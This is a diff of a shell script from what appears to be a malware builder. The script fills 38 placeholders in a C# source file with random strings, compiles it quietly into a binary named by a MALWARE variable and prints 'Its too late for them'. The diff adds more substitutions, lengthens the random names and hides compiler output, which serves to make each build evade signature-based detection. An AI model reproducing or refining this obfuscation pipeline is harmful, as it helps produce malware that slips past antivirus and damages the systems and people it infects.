@@ -48,7 +48,7 @@ sed -i "s/Slucajno7/$Random2/g" test.cs
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno8/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-26} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno9/$Random2/g" test.cs
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-12} | head -n 1 > slovo.txt
@@ -60,10 +60,10 @@ sed -i "s/Slucajno11/$Random2/g" test.cs
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno12/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-25} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno13/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno14/$Random2/g" test.cs
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
@@ -78,44 +78,68 @@ sed -i "s/Slucajno17/$Random2/g" test.cs
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno18/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-25} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno19/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-13} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-28} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno20/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-29} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno21/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-22} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno22/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-23} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno23/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-16} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno24/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-24} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno25/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-21} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-25} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno26/$Random2/g" test.cs
 cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-26} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno27/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-21} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno28/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-23} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-29} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno29/$Random2/g" test.cs
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-22} | head -n 1 > slovo.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-24} | head -n 1 > slovo.txt
 Random2=$(cat slovo.txt)
 sed -i "s/Slucajno30/$Random2/g" test.cs
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
+Random2=$(cat slovo.txt)
+sed -i "s/Slucajno31/$Random2/g" test.cs
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
+Random2=$(cat slovo.txt)
+sed -i "s/Slucajno32/$Random2/g" test.cs 
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-86} | head -n 1 > slovo.txt
+Random2=$(cat slovo.txt)
+sed -i "s/Slucajno33/$Random2/g" test.cs 
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-13} | head -n 1 > slovo.txt
+Random2=$(cat slovo.txt)
+sed -i "s/Slucajno34/$Random2/g" test.cs 
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
+Random2=$(cat slovo.txt)
+sed -i "s/Slucajno35/$Random2/g" test.cs 
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-25} | head -n 1 > slovo.txt
+Random2=$(cat slovo.txt)
+sed -i "s/Slucajno36/$Random2/g" test.cs 
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
+Random2=$(cat slovo.txt)
+sed -i "s/Slucajno37/$Random2/g" test.cs 
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
+Random2=$(cat slovo.txt)
+sed -i "s/Slucajno38/$Random2/g" test.cs 
 rm -rf *.txt
 sleep 2
-mcs -out:$MALWARE test.cs -debug
+mcs -out:$MALWARE test.cs>/dev/null 2>&1
 rm -rf $MALWARE.mdb
 echo "Its too late for them"
